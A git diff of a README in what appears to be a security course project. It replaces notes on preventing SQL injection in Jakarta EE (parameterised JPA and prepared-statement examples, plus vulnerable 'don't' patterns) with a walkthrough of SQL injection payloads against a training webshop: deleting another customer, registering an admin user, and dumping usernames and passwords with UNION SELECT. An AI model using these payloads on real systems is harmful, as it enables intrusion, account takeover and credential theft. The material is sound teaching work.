@@ -1,54 +1,27 @@
-## Jakarta EE overview
-![jakarta overview](jakarta_overview.drawio.png)
+## SQLI in Webshop
 
-### avoid sqli
+### admin user space
 
-ORM / prepared statements:
+enter following text for the delete action parameter id
+    
+    1 or shopuser_id = 2
 
-JPA (Query Builder)
+![deleteCustomer](sqli_deleteCustomer.PNG)
 
-        EntityManager entityManager = EntityManagerfactory.createEntityManager();
-        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
-        CriteriaQuery<Employee> cq = cb.createQuery(Employee.class);
-        Root<Employee> rootEntry = cq.from(Employee.class);
+### anonym user space
+create an admin user from register user endpoint:
 
-        Metamodel m = entityManager.getMetamodel();
-        EntityType<Employee> employee_ = m.entity(Employee.class);
-        cq.select(rootEntry).where(
-                cb.or(
-                    cb.equal(rootEntry.get("eid"), searchRequest.queryId),
-                    cb.like(rootEntry.get("ename"), searchRequest.queryName )));
+following text into username textbox:
 
-        TypedQuery<Employee> query = entityManager.createQuery(cq);
-        return query.getResultList();
+    admin3','pw',3 ) --
 
-JPA (own query language)
+![createAdminUser](sqli_createuser2.PNG)
+![createAdminUser](sqli_createuser.PNG)
 
-         List<Employee> employees = entityManager.createQuery("SELECT e FROM Employee e WHERE e.ename LIKE :ename or e.eid = :eid")
-                .setParameter("ename", sr.queryName)
-                .setParameter("eid", sr.queryId).getResultList();
-        return employees;
+get all info of db
 
-don't 
+    s' UNION ALL SELECT 1, s.username, s.userpassword, 0,0 FROM shopuser s --
 
-        entityManager.createNativeQuery("SELECT * FROM Employee WHERE ename = " + sr.queryName)
+![fetchInfo](fetch_info.PNG)
+![fetchInfo](fetch_info2.PNG)
 
-Prepared statement 
-
-        prepStmt = con.prepareStatement("select eid, ename from Employee where ename like ? or eid = ?");
-        prepStmt.setString(1, sr.queryName);
-        prepStmt.setInt(2, sr.queryId);
-        rs = prepStmt.executeQuery();
-
-        List<Employee> employeeList = new ArrayList<>();
-        while (rs.next()) {
-            int empid = rs.getInt("eid");
-            String name = rs.getString("ename");
-            employeeList.add(new Employee(empid, name, 0, "test"));
-        }
-
-don't
-
-    stmt = con.createStatement();
-    rs = stmt.executeQuery("select eid, ename from Employee " +
-                                    "where ename like '%" + sr.queryName + "%' or eid = " + sr.queryId);
